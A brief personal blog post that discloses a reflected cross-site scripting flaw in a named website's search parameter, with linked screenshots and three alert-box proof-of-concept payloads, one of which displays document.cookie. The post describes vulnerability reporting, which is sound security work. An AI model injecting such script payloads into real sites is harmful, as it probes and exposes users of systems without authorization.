---
layout: post
title: Cross site scripting
subtitle: Reflected XSS on search parameter
#gh-repo: daattali/beautiful-jekyll
#gh-badge: [star, fork, follow]
#tags: [test]
comments: true
---

Recently i found a relected XSS on [https://www.maxmodapk.com](https://www.maxmodapk.com) search parameter ,and i and also checled for RCE and unfortunately i didnt find any RCE vulnerability and suddelny i reported that bug to maxmod domain admin

**Here is the screen shots**















![Crepe](https://i.ibb.co/fx35BWw/Screenshot-2020-11-24-23-49-02-92.jpg)



![Crepe](https://i.ibb.co/kX6jmbv/Screenshot-2020-11-24-23-49-10-76.jpg){: .mx-auto.d-block :}

Here's the payload:

~~~

<script>alert("xss by akshay");</script>


~~~



```

<script>alert(document.cookie);</script>


```



{% highlight javascript linenos %}
<script>alert(document.domain);</script>
 


{% endhighlight %}


















